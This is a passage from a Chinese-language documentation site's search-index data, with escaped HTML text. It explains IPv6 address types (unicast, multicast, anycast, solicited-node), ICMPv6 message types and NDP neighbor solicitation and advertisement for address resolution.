prefix\uff1a\u5168\u7403\u8def\u7531\u524d\u7f00\u3002\u7531\u63d0\u4f9b\u5546\uff08Provider\uff09\u6307\u5b9a\u7ed9\u4e00\u4e2a\u7ec4\u7ec7\u673a\u6784\uff0c\u901a\u5e38\u5168\u7403\u8def\u7531\u524d\u7f00\u81f3\u5c11\u4e3a 48 \u4f4d\u3002\u76ee\u524d\u5df2\u7ecf\u5206\u914d\u7684\u5168\u7403\u8def\u7531\u524d\u7f00\u7684\u524d 3bit \u5747\u4e3a <code>001</code>\u3002</li> <li>Subnet ID\uff1a\u5b50\u7f51 ID\u3002\u7ec4\u7ec7\u673a\u6784\u53ef\u4ee5\u7528\u5b50\u7f51 ID \u6765\u6784\u5efa\u672c\u5730\u7f51\u7edc\uff08Site\uff09\u3002\u5b50\u7f51 ID \u901a\u5e38\u6700\u591a\u5206\u914d\u5230\u7b2c 64 \u4f4d\u3002\u5b50\u7f51 ID \u548c IPv4 \u4e2d\u7684\u5b50\u7f51\u53f7\u4f5c\u7528\u76f8\u4f3c\u3002</li> <li>Interface ID\uff1a\u63a5\u53e3\u6807\u8bc6\u3002\u7528\u6765\u6807\u8bc6\u4e00\u4e2a\u8bbe\u5907\uff08Host\uff09\u3002</li> </ul> </li> </ul> </li> <li> <p>\u94fe\u8def\u672c\u5730\u5730\u5740</p> <p></p> <ul> <li>\u94fe\u8def\u672c\u5730\u5730\u5740\u662f IPv6 \u4e2d\u7684\u5e94\u7528\u8303\u56f4\u53d7\u9650\u5236\u7684\u5730\u5740\u7c7b\u578b\uff0c\u53ea\u80fd\u5728\u8fde\u63a5\u5230\u540c\u4e00\u672c\u5730\u94fe\u8def\u7684\u8282\u70b9\u4e4b\u95f4\u4f7f\u7528\u3002\u5b83\u4f7f\u7528\u4e86\u7279\u5b9a\u7684\u672c\u5730\u94fe\u8def\u524d\u7f00 <code>FE80::/10</code>\uff08\u6700\u9ad8 10 \u4f4d\u503c\u4e3a <code>1111111010</code>\uff09\uff0c\u540c\u65f6\u5c06\u63a5\u53e3\u6807\u8bc6\u6dfb\u52a0\u5728\u540e\u9762\u4f5c\u4e3a\u5730\u5740\u7684\u4f4e 64 \u6bd4\u7279\u3002</li> <li>\u5f53\u4e00\u4e2a\u8282\u70b9\u542f\u52a8 IPv6 \u534f\u8bae\u6808\u65f6\uff0c\u542f\u52a8\u65f6\u8282\u70b9\u7684\u6bcf\u4e2a\u63a5\u53e3\u4f1a\u81ea\u52a8\u914d\u7f6e\u4e00\u4e2a\u94fe\u8def\u672c\u5730\u5730\u5740\uff08\u5176\u56fa\u5b9a\u7684\u524d\u7f00+EUI-64 \u89c4\u5219\u5f62\u6210\u7684\u63a5\u53e3\u6807\u8bc6\uff09\u3002\u8fd9\u79cd\u673a\u5236\u4f7f\u5f97\u4e24\u4e2a\u8fde\u63a5\u5230\u540c\u4e00\u94fe\u8def\u7684 IPv6 \u8282\u70b9\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u914d\u7f6e\u5c31\u53ef\u4ee5\u901a\u4fe1\u3002\u6240\u4ee5\u94fe\u8def\u672c\u5730\u5730\u5740\u5e7f\u6cdb\u5e94\u7528\u4e8e\u90bb\u5c45\u53d1\u73b0\uff0c\u65e0\u72b6\u6001\u5730\u5740\u914d\u7f6e\u7b49\u5e94\u7528\u3002</li> <li>\u4ee5\u94fe\u8def\u672c\u5730\u5730\u5740\u4e3a\u6e90\u5730\u5740\u6216\u76ee\u7684\u5730\u5740\u7684 IPv6 \u62a5\u6587\u4e0d\u4f1a\u88ab\u8def\u7531\u8bbe\u5907\u8f6c\u53d1\u5230\u5176\u4ed6\u94fe\u8def\u3002</li> </ul> </li> <li> <p>\u552f\u4e00\u672c\u5730\u5730\u5740</p> <p></p> <ul> <li>\u552f\u4e00\u672c\u5730\u5730\u5740\u662f\u53e6\u4e00\u79cd\u5e94\u7528\u8303\u56f4\u53d7\u9650\u7684\u5730\u5740\uff0c\u5b83\u4ec5\u80fd\u5728\u4e00\u4e2a\u7ad9\u70b9\u5185\u4f7f\u7528\u3002\u7531\u4e8e\u672c\u5730\u7ad9\u70b9\u5730\u5740\u7684\u5e9f\u9664\uff08RFC3879\uff09\uff0c\u552f\u4e00\u672c\u5730\u5730\u5740\u88ab\u7528\u6765\u4ee3\u66ff\u672c\u5730\u7ad9\u70b9\u5730\u5740\u3002</li> <li>\u552f\u4e00\u672c\u5730\u5730\u5740\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e IPv4 \u4e2d\u7684\u79c1\u7f51\u5730\u5740\uff0c\u4efb\u4f55\u6ca1\u6709\u7533\u8bf7\u5230\u63d0\u4f9b\u5546\u5206\u914d\u7684\u5168\u7403\u5355\u64ad\u5730\u5740\u7684\u7ec4\u7ec7\u673a\u6784\u90fd\u53ef\u4ee5\u4f7f\u7528\u552f\u4e00\u672c\u5730\u5730\u5740\u3002\u552f\u4e00\u672c\u5730\u5730\u5740\u53ea\u80fd\u5728\u672c\u5730\u7f51\u7edc\u5185\u90e8\u88ab\u8def\u7531\u8f6c\u53d1\u800c\u4e0d\u4f1a\u5728\u5168\u7403\u7f51\u7edc\u4e2d\u88ab\u8def\u7531\u8f6c\u53d1\u3002</li> <li>\u552f\u4e00\u672c\u5730\u5730\u5740\u683c\u5f0f\uff1a<ul> <li>Prefix\uff1a\u524d\u7f00\uff1b\u56fa\u5b9a\u4e3a <code>FC00::/7</code>\u3002</li> <li>L\uff1aL \u6807\u5fd7\u4f4d\uff1b\u503c\u4e3a 1 \u4ee3\u8868\u8be5\u5730\u5740\u4e3a\u5728\u672c\u5730\u7f51\u7edc\u8303\u56f4\u5185\u4f7f\u7528\u7684\u5730\u5740\uff1b\u503c\u4e3a 0 \u88ab\u4fdd\u7559\uff0c\u7528\u4e8e\u4ee5\u540e\u6269\u5c55\u3002</li> <li>Global ID\uff1a\u5168\u7403\u552f\u4e00\u524d\u7f00\uff1b\u901a\u8fc7\u4f2a\u968f\u673a\u65b9\u5f0f\u4ea7\u751f\u3002</li> <li>Subnet ID\uff1a\u5b50\u7f51 ID\uff1b\u5212\u5206\u5b50\u7f51\u4f7f\u7528\u3002</li> <li>Interface ID\uff1a\u63a5\u53e3\u6807\u8bc6\u3002</li> </ul> </li> <li>\u552f\u4e00\u672c\u5730\u5730\u5740\u7279\u70b9\uff1a<ul> <li>\u5177\u6709\u5168\u7403\u552f\u4e00\u7684\u524d\u7f00\uff08\u867d\u7136\u968f\u673a\u65b9\u5f0f\u4ea7\u751f\uff0c\u4f46\u662f\u51b2\u7a81\u6982\u7387\u5f88\u4f4e\uff09\u3002</li> <li>\u53ef\u4ee5\u8fdb\u884c\u7f51\u7edc\u4e4b\u95f4\u7684\u79c1\u6709\u8fde\u63a5\uff0c\u800c\u4e0d\u5fc5\u62c5\u5fc3\u5730\u5740\u51b2\u7a81\u7b49\u95ee\u9898\u3002</li> <li>\u5177\u6709\u77e5\u540d\u524d\u7f00\uff08FC00::/7\uff09\uff0c\u65b9\u4fbf\u8fb9\u7f18\u8bbe\u5907\u8fdb\u884c\u8def\u7531\u8fc7\u6ee4\u3002</li> <li>\u5982\u679c\u51fa\u73b0\u8def\u7531\u6cc4\u6f0f\uff0c\u8be5\u5730\u5740\u4e0d\u4f1a\u548c\u5176\u4ed6\u5730\u5740\u51b2\u7a81\uff0c\u4e0d\u4f1a\u9020\u6210 Internet \u8def\u7531\u51b2\u7a81\u3002</li> <li>\u5e94\u7528\u4e2d\uff0c\u4e0a\u5c42\u5e94\u7528\u7a0b\u5e8f\u5c06\u8fd9\u4e9b\u5730\u5740\u770b\u4f5c\u5168\u7403\u5355\u64ad\u5730\u5740\u5bf9\u5f85\u3002</li> <li>\u72ec\u7acb\u4e8e\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546 ISP\uff08Internet Service Provider\uff09\u3002</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u7ec4\u64ad\u5730\u5740\uff1aIPv6 \u7684\u7ec4\u64ad\u4e0e IPv4 \u76f8\u540c\uff0c\u7528\u6765\u6807\u8bc6\u4e00\u7ec4\u63a5\u53e3\uff0c\u4e00\u822c\u8fd9\u4e9b\u63a5\u53e3\u5c5e\u4e8e\u4e0d\u540c\u7684\u8282\u70b9\u3002\u4e00\u4e2a\u8282\u70b9\u53ef\u80fd\u5c5e\u4e8e 0 \u5230\u591a\u4e2a\u7ec4\u64ad\u7ec4\u3002\u53d1\u5f80\u7ec4\u64ad\u5730\u5740\u7684\u62a5\u6587\u88ab\u7ec4\u64ad\u5730\u5740\u6807\u8bc6\u7684\u6240\u6709\u63a5\u53e3\u63a5\u6536\u3002\u4f8b\u5982\u7ec4\u64ad\u5730\u5740 <code>FF02::1</code> \u8868\u793a\u94fe\u8def\u672c\u5730\u8303\u56f4\u7684\u6240\u6709\u8282\u70b9\uff0c\u7ec4\u64ad\u5730\u5740 <code>FF02::2</code> \u8868\u793a\u94fe\u8def\u672c\u5730\u8303\u56f4\u7684\u6240\u6709\u8def\u7531\u5668\u3002</p> <p></p> <ul> <li>\u4e00\u4e2a IPv6 \u7ec4\u64ad\u5730\u5740\u7531\u524d\u7f00\uff0c\u6807\u5fd7\uff08Flag\uff09\u5b57\u6bb5\u3001\u8303\u56f4\uff08Scope\uff09\u5b57\u6bb5\u4ee5\u53ca\u7ec4\u64ad\u7ec4 ID\uff08Group ID\uff094 \u4e2a\u90e8\u5206\u7ec4\u6210\uff1a<ul> <li>\u524d\u7f00\uff1aIPv6 \u7ec4\u64ad\u5730\u5740\u7684\u524d\u7f00\u662f <code>FF00::/8</code>\u3002</li> <li>\u6807\u5fd7\u5b57\u6bb5\uff08Flag\uff09\uff1a\u957f\u5ea6 4bit\uff0c\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u540e\u9762 3 \u4e2a\u6bd4\u7279\uff08\u7b2c\u4e00\u4f4d\u5fc5\u987b\u7f6e 0\uff09\u3002\u5f53\u6700\u540e\u4e00\u4f4d\u503c\u4e3a 0 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u7684\u7ec4\u64ad\u5730\u5740\u662f\u7531 IANA \u6240\u5206\u914d\u7684\u4e00\u4e2a\u6c38\u4e45\u5206\u914d\u5730\u5740\uff1b\u5f53\u6700\u540e\u4e00\u4f4d\u503c\u4e3a 1 \u65f6\uff0c\u8868\u793a\u5f53\u524d\u7684\u7ec4\u64ad\u5730\u5740\u662f\u4e00\u4e2a\u4e34\u65f6\u7ec4\u64ad\u5730\u5740\uff08\u975e\u6c38\u4e45\u5206\u914d\u5730\u5740\uff09\u3002</li> <li>\u8303\u56f4\u5b57\u6bb5\uff08Scope\uff09\uff1a\u957f\u5ea6 4bit\uff0c\u7528\u6765\u9650\u5236\u7ec4\u64ad\u6570\u636e\u6d41\u5728\u7f51\u7edc\u4e2d\u53d1\u9001\u7684\u8303\u56f4\u3002</li> <li>\u7ec4\u64ad\u7ec4 ID\uff08Group ID\uff09\uff1a\u957f\u5ea6 112bit\uff0c\u7528\u4ee5\u6807\u8bc6\u7ec4\u64ad\u7ec4\u3002\u76ee\u524d\uff0cRFC2373 \u5e76\u6ca1\u6709\u5c06\u6240\u6709\u7684 112 \u4f4d\u90fd\u5b9a\u4e49\u6210\u7ec4\u6807\u8bc6\uff0c\u800c\u662f\u5efa\u8bae\u4ec5\u4f7f\u7528\u8be5 112 \u4f4d\u7684\u6700\u4f4e 32 \u4f4d\u4f5c\u4e3a\u7ec4\u64ad\u7ec4 ID\uff0c\u5c06\u5269\u4f59\u7684 80 \u4f4d\u90fd\u7f6e 0\u3002\u8fd9\u6837\u6bcf\u4e2a\u7ec4\u64ad\u7ec4 ID \u90fd\u6620\u5c04\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u4ee5\u592a\u7f51\u7ec4\u64ad MAC \u5730\u5740\uff08RFC2464\uff09\u3002</li> </ul> </li> <li>\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740<ul> <li>\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\u901a\u8fc7\u8282\u70b9\u7684\u5355\u64ad\u6216\u4efb\u64ad\u5730\u5740\u751f\u6210\u3002\u5f53\u4e00\u4e2a\u8282\u70b9\u5177\u6709\u4e86\u5355\u64ad\u6216\u4efb\u64ad\u5730\u5740\uff0c\u5c31\u4f1a\u5bf9\u5e94\u751f\u6210\u4e00\u4e2a\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\uff0c\u5e76\u4e14\u52a0\u5165\u8fd9\u4e2a\u7ec4\u64ad\u7ec4\u3002\u4e00\u4e2a\u5355\u64ad\u5730\u5740\u6216\u4efb\u64ad\u5730\u5740\u5bf9\u5e94\u4e00\u4e2a\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\u3002\u8be5\u5730\u5740\u4e3b\u8981\u7528\u4e8e\u90bb\u5c45\u53d1\u73b0\u673a\u5236\u548c\u5730\u5740\u91cd\u590d\u68c0\u6d4b\u529f\u80fd\u3002</li> <li>IPv6 \u4e2d\u6ca1\u6709\u5e7f\u64ad\u5730\u5740\uff0c\u4e5f\u4e0d\u4f7f\u7528 ARP\u3002\u4f46\u662f\u4ecd\u7136\u9700\u8981\u4ece IP \u5730\u5740\u89e3\u6790\u5230 MAC \u5730\u5740\u7684\u529f\u80fd\u3002\u5728 IPv6 \u4e2d\uff0c\u8fd9\u4e2a\u529f\u80fd\u901a\u8fc7\u90bb\u5c45\u8bf7\u6c42 NS\uff08Neighbor Solicitation\uff09\u62a5\u6587\u5b8c\u6210\u3002\u5f53\u4e00\u4e2a\u8282\u70b9\u9700\u8981\u89e3\u6790\u67d0\u4e2a IPv6 \u5730\u5740\u5bf9\u5e94\u7684 MAC \u5730\u5740\u65f6\uff0c\u4f1a\u53d1\u9001 NS \u62a5\u6587\uff0c\u8be5\u62a5\u6587\u7684\u76ee\u7684 IP \u5c31\u662f\u9700\u8981\u89e3\u6790\u7684 IPv6 \u5730\u5740\u5bf9\u5e94\u7684\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\uff1b\u53ea\u6709\u5177\u6709\u8be5\u7ec4\u64ad\u5730\u5740\u7684\u8282\u70b9\u4f1a\u68c0\u67e5\u5904\u7406\u3002</li> <li>\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\u7531\u524d\u7f00 <code>FF02::1:FF00:0/104</code>\u548c\u5355\u64ad\u5730\u5740\u7684\u6700\u540e 24 \u4f4d\u7ec4\u6210\u3002</li> </ul> </li> </ul> </li> <li> <p>\u4efb\u64ad\u5730\u5740\uff1a\u4efb\u64ad\u5730\u5740\u6807\u8bc6\u4e00\u7ec4\u7f51\u7edc\u63a5\u53e3\uff08\u901a\u5e38\u5c5e\u4e8e\u4e0d\u540c\u7684\u8282\u70b9\uff09\u3002\u76ee\u6807\u5730\u5740\u662f\u4efb\u64ad\u5730\u5740\u7684\u6570\u636e\u5305\u5c06\u53d1\u9001\u7ed9\u5176\u4e2d\u8def\u7531\u610f\u4e49\u4e0a\u6700\u8fd1\u7684\u4e00\u4e2a\u7f51\u7edc\u63a5\u53e3\u3002</p> <ul> <li>\u4efb\u64ad\u5730\u5740\u8bbe\u8ba1\u7528\u6765\u5728\u7ed9\u591a\u4e2a\u4e3b\u673a\u6216\u8005\u8282\u70b9\u63d0\u4f9b\u76f8\u540c\u670d\u52a1\u65f6\u63d0\u4f9b\u5197\u4f59\u529f\u80fd\u548c\u8d1f\u8f7d\u5206\u62c5\u529f\u80fd\u3002\u76ee\u524d\uff0c\u4efb\u64ad\u5730\u5740\u7684\u4f7f\u7528\u901a\u8fc7\u5171\u4eab\u5355\u64ad\u5730\u5740\u65b9\u5f0f\u6765\u5b8c\u6210\u3002\u5c06\u4e00\u4e2a\u5355\u64ad\u5730\u5740\u5206\u914d\u7ed9\u591a\u4e2a\u8282\u70b9\u6216\u8005\u4e3b\u673a\uff0c\u8fd9\u6837\u5728\u7f51\u7edc\u4e2d\u5982\u679c\u5b58\u5728\u591a\u6761\u8be5\u5730\u5740\u8def\u7531\uff0c\u5f53\u53d1\u9001\u8005\u53d1\u9001\u4ee5\u4efb\u64ad\u5730\u5740\u4e3a\u76ee\u7684 IP \u7684\u6570\u636e\u62a5\u6587\u65f6\uff0c\u53d1\u9001\u8005\u65e0\u6cd5\u63a7\u5236\u54ea\u53f0\u8bbe\u5907\u80fd\u591f\u6536\u5230\uff0c\u8fd9\u53d6\u51b3\u4e8e\u6574\u4e2a\u7f51\u7edc\u4e2d\u8def\u7531\u534f\u8bae\u8ba1\u7b97\u7684\u7ed3\u679c\u3002\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u9002\u7528\u4e8e\u4e00\u4e9b\u65e0\u72b6\u6001\u7684\u5e94\u7528\uff0c\u4f8b\u5982 DNS \u7b49\u3002</li> <li>IPv6 \u4e2d\u6ca1\u6709\u4e3a\u4efb\u64ad\u89c4\u5b9a\u5355\u72ec\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u4efb\u64ad\u5730\u5740\u548c\u5355\u64ad\u5730\u5740\u4f7f\u7528\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u3002\u76ee\u524d IPv6 \u4e2d\u4efb\u64ad\u4e3b\u8981\u5e94\u7528\u4e8e\u79fb\u52a8 IPv6\u3002</li> <li>IPv6 \u4efb\u64ad\u5730\u5740\u4ec5\u53ef\u4ee5\u88ab\u5206\u914d\u7ed9\u8def\u7531\u8bbe\u5907\uff0c\u4e0d\u80fd\u5e94\u7528\u4e8e\u4e3b\u673a\u3002\u4efb\u64ad\u5730\u5740\u4e0d\u80fd\u4f5c\u4e3a IPv6 \u62a5\u6587\u7684\u6e90\u5730\u5740\u3002</li> <li>\u5b50\u7f51\u8def\u7531\u5668\u4efb\u64ad\u5730\u5740<ul> <li>\u5b50\u7f51\u8def\u7531\u5668\u4efb\u64ad\u5730\u5740\u662f\u5df2\u7ecf\u5b9a\u4e49\u597d\u7684\u4e00\u79cd\u4efb\u64ad\u5730\u5740\uff08RFC3513\uff09\u3002\u53d1\u9001\u5230\u5b50\u7f51\u8def\u7531\u5668\u4efb\u64ad\u5730\u5740\u7684\u62a5\u6587\u4f1a\u88ab\u53d1\u9001\u5230\u8be5\u5730\u5740\u6807\u8bc6\u7684\u5b50\u7f51\u4e2d\u8def\u7531\u610f\u4e49\u4e0a\u6700\u8fd1\u7684\u4e00\u4e2a\u8bbe\u5907\u3002\u6240\u6709\u8bbe\u5907\u90fd\u5fc5\u987b\u652f\u6301\u5b50\u7f51\u4efb\u64ad\u5730\u5740\u3002\u5b50\u7f51\u8def\u7531\u5668\u4efb\u64ad\u5730\u5740\u7528\u4e8e\u8282\u70b9\u9700\u8981\u548c\u8fdc\u7aef\u5b50\u7f51\u4e0a\u6240\u6709\u8bbe\u5907\u4e2d\u7684\u4e00\u4e2a\uff08\u4e0d\u5173\u5fc3\u5177\u4f53\u662f\u54ea\u4e00\u4e2a\uff09\u901a\u4fe1\u65f6\u4f7f\u7528\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u79fb\u52a8\u8282\u70b9\u9700\u8981\u548c\u5b83\u7684\u201c\u5bb6\u4e61\u201d\u5b50\u7f51\u4e0a\u7684\u6240\u6709\u79fb\u52a8\u4ee3\u7406\u4e2d\u7684\u4e00\u4e2a\u8fdb\u884c\u901a\u4fe1\u3002</li> <li>\u5b50\u7f51\u8def\u7531\u5668\u4efb\u64ad\u5730\u5740\u7531 n bit \u5b50\u7f51\u524d\u7f00\u6807\u8bc6\u5b50\u7f51\uff0c\u5176\u4f59\u7528 0 \u586b\u5145\u3002</li> </ul> </li> </ul> </li> </ul> <p>\u603b\u7ed3</p> \u5730\u5740 \u4f5c\u7528 <code>::</code> \u672a\u6307\u5b9a\u5730\u5740 <code>::1</code> \u73af\u56de\u5730\u5740 <code>2000::/3</code> \u5168\u7403\u5355\u64ad\u5730\u5740 <code>FE80::/10</code> \u94fe\u8def\u672c\u5730\u5730\u5740 <code>FC00::/7</code> \u552f\u4e00\u672c\u5730\u5730\u5740 <code>FF00::/8</code> \u7ec4\u64ad\u5730\u5740 <code>FF02::1</code> \u94fe\u8def\u672c\u5730\u8303\u56f4\u7684\u6240\u6709\u8282\u70b9 <code>FF02::2</code> \u94fe\u8def\u672c\u5730\u8303\u56f4\u7684\u6240\u6709\u8def\u7531\u5668","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#icmpv6","title":"ICMPv6","text":"<p>\u5728 IPv6 \u4e2d\uff0cICMPv6 \u9664\u4e86\u63d0\u4f9b ICMPv4 \u5e38\u7528\u7684\u529f\u80fd\u4e4b\u5916\uff0c\u8fd8\u662f\u5176\u5b83\u4e00\u4e9b\u529f\u80fd\u7684\u57fa\u7840\uff0c\u5982\u90bb\u63a5\u70b9\u53d1\u73b0\u3001\u65e0\u72b6\u6001\u5730\u5740\u914d\u7f6e\uff08\u5305\u62ec\u91cd\u590d\u5730\u5740\u68c0\u6d4b\uff09\u3001PMTU \u53d1\u73b0\u7b49\u3002ICMPv6 \u7684\u534f\u8bae\u7c7b\u578b\u53f7\uff08\u5373 IPv6 \u62a5\u6587\u4e2d\u7684 Next Header \u5b57\u6bb5\u7684\u503c\uff09\u4e3a 58\u3002</p> <p>ICMPv6 \u9519\u8bef\u62a5\u6587\u7528\u4e8e\u62a5\u544a\u5728\u8f6c\u53d1 IPv6 \u6570\u636e\u5305\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\u3002ICMPv6 \u9519\u8bef\u62a5\u6587\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b 4 \u79cd\uff1a</p> <ul> <li>\u76ee\u7684\u4e0d\u53ef\u8fbe\u9519\u8bef\u62a5\u6587</li> <li>\u6570\u636e\u5305\u8fc7\u5927\u9519\u8bef\u62a5\u6587</li> <li>\u65f6\u95f4\u8d85\u65f6\u9519\u8bef\u62a5\u6587</li> <li>\u53c2\u6570\u9519\u8bef\u62a5\u6587</li> </ul> <p>ICMPv6 \u4fe1\u606f\u62a5\u6587\u63d0\u4f9b\u8bca\u65ad\u529f\u80fd\u548c\u9644\u52a0\u7684\u4e3b\u673a\u529f\u80fd\uff0c\u6bd4\u5982\u591a\u64ad\u4fa6\u542c\u53d1\u73b0\u548c\u90bb\u5c45\u53d1\u73b0\u3002\u5e38\u89c1\u7684 ICMPv6 \u4fe1\u606f\u62a5\u6587\u4e3b\u8981\u5305\u62ec\u56de\u9001\u8bf7\u6c42\u62a5\u6587\uff08Echo Request\uff09\u548c\u56de\u9001\u5e94\u7b54\u62a5\u6587\uff08Echo Reply\uff09\uff0c\u8fd9\u4e24\u79cd\u62a5\u6587\u4e5f\u5c31\u662f\u901a\u5e38\u4f7f\u7528\u7684 Ping \u62a5\u6587\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#ndp","title":"NDP","text":"<p>\u90bb\u5c45\u53d1\u73b0\u534f\u8bae NDP\uff08Neighbor Discovery Protocol\uff09\u662f IPv6 \u534f\u8bae\u4f53\u7cfb\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u57fa\u7840\u534f\u8bae\u3002\u90bb\u5c45\u53d1\u73b0\u534f\u8bae\u66ff\u4ee3\u4e86 IPv4 \u7684 ARP\uff08Address Resolution Protocol\uff09\u548c ICMP \u8def\u7531\u5668\u53d1\u73b0\uff08Router Discovery\uff09\uff0c\u5b83\u5b9a\u4e49\u4e86\u4f7f\u7528 ICMPv6 \u62a5\u6587\u5b9e\u73b0\u5730\u5740\u89e3\u6790\uff0c\u8ddf\u8e2a\u90bb\u5c45\u72b6\u6001\uff0c\u91cd\u590d\u5730\u5740\u68c0\u6d4b\uff0c\u8def\u7531\u5668\u53d1\u73b0\u4ee5\u53ca\u91cd\u5b9a\u5411\u7b49\u529f\u80fd\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#\u5730\u5740\u89e3\u6790","title":"\u5730\u5740\u89e3\u6790","text":"<p>\u5728 IPv4 \u4e2d\uff0c\u5f53\u4e3b\u673a\u9700\u8981\u548c\u76ee\u6807\u4e3b\u673a\u901a\u4fe1\u65f6\uff0c\u5fc5\u987b\u5148\u901a\u8fc7 ARP \u534f\u8bae\u83b7\u5f97\u76ee\u7684\u4e3b\u673a\u7684\u94fe\u8def\u5c42\u5730\u5740\u3002\u5728 IPv6 \u4e2d\uff0c\u540c\u6837\u9700\u8981\u4ece IP \u5730\u5740\u89e3\u6790\u5230\u94fe\u8def\u5c42\u5730\u5740\u7684\u529f\u80fd\u3002\u90bb\u5c45\u53d1\u73b0\u534f\u8bae\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\u3002</p> <p>ICMPv6 \u4e0e ARP \u7684\u6bd4\u8f83</p> <p>ARP \u62a5\u6587\u662f\u76f4\u63a5\u5c01\u88c5\u5728\u4ee5\u592a\u7f51\u62a5\u6587\u4e2d\uff0c\u4ee5\u592a\u7f51\u534f\u8bae\u7c7b\u578b\u4e3a <code>0x0806</code>\uff0c\u666e\u904d\u89c2\u70b9\u8ba4\u4e3a ARP \u5b9a\u4f4d\u4e3a\u7b2c 2.5 \u5c42\u7684\u534f\u8bae\u3002ND \u672c\u8eab\u57fa\u4e8e ICMPv6 \u5b9e\u73b0\uff0c\u4ee5\u592a\u7f51\u534f\u8bae\u7c7b\u578b\u4e3a 0x86DD\uff0c\u5373 IPv6 \u62a5\u6587\uff0cIPv6 \u4e0b\u4e00\u4e2a\u62a5\u5934\u5b57\u6bb5\u503c\u4e3a 58\uff0c\u8868\u793a ICMPv6 \u62a5\u6587\uff0c\u7531\u4e8e ND \u534f\u8bae\u4f7f\u7528\u7684\u6240\u6709\u62a5\u6587\u5747\u5c01\u88c5\u5728 ICMPv6 \u62a5\u6587\u4e2d\uff0c\u4e00\u822c\u6765\u8bf4\uff0cND \u88ab\u770b\u4f5c\u7b2c 3 \u5c42\u7684\u534f\u8bae\u3002\u5728\u4e09\u5c42\u5b8c\u6210\u5730\u5740\u89e3\u6790\uff0c\u4e3b\u8981\u5e26\u6765\u4ee5\u4e0b\u51e0\u4e2a\u597d\u5904\uff1a</p> <ul> <li>\u5730\u5740\u89e3\u6790\u5728\u4e09\u5c42\u5b8c\u6210\uff0c\u4e0d\u540c\u7684\u4e8c\u5c42\u4ecb\u8d28\u53ef\u4ee5\u91c7\u7528\u76f8\u540c\u7684\u5730\u5740\u89e3\u6790\u534f\u8bae\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528\u4e09\u5c42\u7684\u5b89\u5168\u673a\u5236\u907f\u514d\u5730\u5740\u89e3\u6790\u653b\u51fb\u3002</li> <li>\u4f7f\u7528\u7ec4\u64ad\u65b9\u5f0f\u53d1\u9001\u8bf7\u6c42\u62a5\u6587\uff0c\u51cf\u5c11\u4e86\u4e8c\u5c42\u7f51\u7edc\u7684\u6027\u80fd\u538b\u529b\u3002</li> </ul> <p>\u5730\u5740\u89e3\u6790\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u4e24\u79cd ICMPv6 \u62a5\u6587\uff1a\u90bb\u5c45\u8bf7\u6c42\u62a5\u6587 NS\uff08Neighbor Solicitation\uff09\u548c\u90bb\u5c45\u901a\u544a\u62a5\u6587 NA\uff08Neighbor Advertisement\uff09\u3002</p> <ul> <li>NS \u62a5\u6587\uff1a\u5728\u5730\u5740\u89e3\u6790\u4e2d\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e IPv4 \u4e2d\u7684 ARP \u8bf7\u6c42\u62a5\u6587\u3002</li> <li>NA \u62a5\u6587\uff1a\u5728\u5730\u5740\u89e3\u6790\u4e2d\u7684\u4f5c\u7528\u7c7b\u4f3c\u4e8e IPv4 \u4e2d\u7684 ARP \u5e94\u7b54\u62a5\u6587\u3002</li> </ul>      \u90bb\u5c45\u53d1\u73b0\u534f\u8bae      <p>Example</p> <p>Host A \u5728\u5411 Host B \u53d1\u9001\u62a5\u6587\u4e4b\u524d\u5b83\u5fc5\u987b\u8981\u89e3\u6790\u51fa Host B \u7684\u94fe\u8def\u5c42\u5730\u5740\uff0c\u6240\u4ee5\u9996\u5148 Host A \u4f1a\u53d1\u9001\u4e00\u4e2a NS \u62a5\u6587\uff0c\u5176\u4e2d\u6e90\u5730\u5740\u4e3a Host A \u7684 IPv6 \u5730\u5740\uff0c\u76ee\u7684\u5730\u5740\u4e3a Host B \u7684\u88ab\u8bf7\u6c42\u8282\u70b9\u7ec4\u64ad\u5730\u5740\uff0c\u9700\u8981\u89e3\u6790\u7684\u76ee\u6807 IP \u4e3a Host B \u7684 IPv6 \u5730\u5740\uff0c\u8fd9\u5c31\u8868\u793a Host A \u60f3\u8981\u77e5\u9053 Host B \u7684\u94fe\u8def\u5c42\u5730\u5740\u3002\u540c\u65f6\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u5728 NS \u62a5\u6587\u7684 Options \u5b57\u6bb5\u4e2d\u8fd8\u643a\u5e26\u4e86 Host A \u7684\u94fe\u8def\u5c42\u5730\u5740\u3002</p> <p>\u5f53 Host B \u63a5\u6536\u5230\u4e86 NS \u62a5\u6587\u4e4b\u540e\uff0c\u5c31\u4f1a\u56de\u5e94 NA \u62a5\u6587\uff0c\u5176\u4e2d\u6e90\u5730\u5740\u4e3a Host B \u7684 IPv6 \u5730\u5740\uff0c\u76ee\u7684\u5730\u5740\u4e3a Host A \u7684 IPv6 \u5730\u5740\uff08\u4f7f\u7528 NS \u62a5\u6587\u4e2d\u7684 Host A 